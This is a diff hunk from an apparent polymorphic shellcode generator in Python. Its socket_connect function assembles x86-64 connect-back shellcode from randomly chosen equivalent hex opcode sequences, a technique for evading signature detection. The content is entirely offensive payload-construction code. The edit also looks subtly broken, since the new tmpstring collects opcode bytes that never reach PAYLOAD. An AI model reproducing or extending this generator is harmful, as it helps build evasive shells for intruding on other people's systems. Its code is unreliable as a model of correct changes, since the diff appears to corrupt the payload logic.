@@ -147,11 +147,12 @@ def create_socket():
 
 def socket_connect(ip, port):
    global PAYLOAD
+   tmpstring = ""
    l = ["4889c74989fa", "4889c74989C2", "50415a4c89d7", "4989c24889c7"] # mov rdi, rax; mov r10, rax | push rax; pop rdi; mov r10, rdi | push rax; pop r10; mov rdi, r10 | mov r10, rax ; mov rdi, rax
-   PAYLOAD += l[r(0,len(l)-1)]   
+   tmpstring += l[r(0,len(l)-1)]   
    clean("rax")
-   PAYLOAD += "b02a" if r(0,1) else "042a"
-   clean("rbx")
+   tmpstring+= "b02a" if r(0,1) else "042a"
+   PAYLOAD += clean("rbx")
    PAYLOAD += "53" # push rbx
    ip_greater = []
    ip_to_substract = []
